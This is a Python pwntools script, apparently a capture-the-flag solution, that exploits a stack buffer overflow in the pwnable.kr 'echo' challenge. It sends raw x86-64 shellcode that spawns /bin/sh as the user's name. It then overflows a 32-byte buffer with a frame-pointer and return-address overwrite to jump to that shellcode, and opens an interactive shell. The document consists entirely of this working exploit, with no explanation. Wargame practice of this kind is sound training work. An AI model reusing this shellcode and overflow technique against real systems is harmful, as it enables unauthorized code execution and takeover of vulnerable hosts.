from pwn import *
import string

conn = remote("pwnable.kr", 9010)

def BOF_echo(data):
	conn.sendlineafter("> ","1")
	conn.recvline()
	conn.sendline(data)
	print(conn.recvuntil("goodbye "))

SHELLCODE23 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

conn.sendlineafter("name? :", SHELLCODE23)
conn.recvuntil("- 4. : exit")

BOF_echo("A"*32+p64(0x602098-0x8)+p64(0x400870))

conn.interactive()

